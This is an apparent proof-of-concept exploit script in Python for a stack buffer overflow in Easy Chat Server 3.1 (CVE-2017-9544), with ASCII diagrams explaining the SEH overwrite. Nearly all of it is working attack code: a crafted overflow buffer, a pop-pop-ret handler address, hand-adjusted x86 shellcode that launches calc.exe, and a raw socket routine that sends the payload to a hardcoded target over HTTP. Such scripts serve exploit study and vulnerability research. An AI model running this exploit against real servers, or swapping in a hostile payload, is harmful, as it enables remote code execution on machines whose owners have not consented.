# PoC Exploit Title: Easy Chat Server 3.1 Stack Buffer Overflow (SEH)
# Author: Cosmo
# Vulnerability Type: User mode write stack buffer overflow
# Tested on: [Windows XP, 7, 8, Windows 10][SEHOP & DEP Disabled]
# Date: 02/08/2019
# (Fixed) Shellcode: calc bombing: https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#test_shellcode
# CVE: CVE-2017-9544

import string, sys
import socket, requests, urllib, socket

target = "192.168.1.10"
port = 80

buffer = b'A' * 217
buffer += b"\xEB\x06\x90\x90"  # jump to shellcode (6 bytes)    [<== overwrites pointer to next SEH structure]
buffer += b"\xDB\xB1\x01\x10"  # pop pop ret                    [Current SEH Handler]

buffer +=  (b"\x50\x53\x51\x52\x56\x57\x55\x89"
			b"\xe5\x83\xec\x18\x31\xf6\x56\x6a"
			b"\x63\x66\x68\x78\x65\x68\x57\x69"
			b"\x6e\x45\x89\x65\xfc\x31\xf6\x64"
			b"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
			b"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
			b"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
			b"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
			b"\x48\x24\x01\xd9\x89\x4d\xf4"
            b"\x31\xFF\x6A\x10\x5F\x83\xC7\x10\x8B\x3C\x38\x01\xdf\x89\x7d\xf0\x8b"   # Had to adjust the shellcode: \x8b\x78\x20 mov edi eax+0x20 (0x20 = bad) caused networking issuess
			b"\x50\x1c\x01\xda\x89\x55\xec\x8b"
			b"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
			b"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
			b"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
			b"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
			b"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
			b"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
			b"\x8b\x04\x41\x8b\x04\x82\x01\xd8"
			b"\x31\xd2\x52\x68\x2e\x65\x78\x65"
			b"\x68\x63\x61\x6c\x63\x68\x6d\x33"
			b"\x32\x5c\x68\x79\x73\x74\x65\x68"
			b"\x77\x73\x5c\x53\x68\x69\x6e\x64"
			b"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
			b"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
			b"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3")

"""
SHELLCODE SCHEMATIC

1st exception occurs :
 |
 --------------------------- (1)
                            |
                     -------+-------------- (3) opcode in next SEH : jump over SE Handler to the shellcode
                     |      |             |
                     |      V             V
[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]
                opcode to   do                 (3) Shellcode gets executed
                jump over   pop pop ret
                SE Handler   |
                ^            |
                |            |
                -------------- (2) puts address of next SEH location in EIP, so opcode gets executed


ABSTRACT SCHEMATIC

  +------------------------+
  |                        |
  |     Access violation   |
  |                        |
  +------------------------+
              |
              | 1. Access violation occured,
              |    triggers SEH handler 
              |    (pointer from TEB)
              |         +-----------------------------------+ 4. Overwritten with
              |         |                                   |    jmp to shellcode
              |         | +--> Pointer to next SEH struct   +--------------------->  SHELLCODE
              +--------------> Current SEH handler          |
                        | |             +                   |
                        +-----------------------------------+
                          |             |
                          |             | 2. Current handler overwritten
                          |             |    with *ptr to pop,pop,ret
                          |             |
                          |             v
                          +-----+  pop,pop,ret

                           3. SEH handler effectively jumps
                              to next SEH struct (which is a jump
                              to our shellcode).

                           Why? The pointer to next SEH struct
                                is stored at EBP+8 in the
                                current SEH frame. pop,pop,ret
                                then stores the "pointer" in EIP.
"""



print("Running ...")

msg = bytearray("GET /chat.ghp?username=","utf-8")
msg += buffer
msg += bytearray("&password=&room=1&sex=2 HTTP/1.1\r\n","utf-8")
msg += bytearray("Host: {}\r\n\r\n".format(target),"utf-8")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
s.connect((target, port))

print(msg)
s.send(msg)
s.close()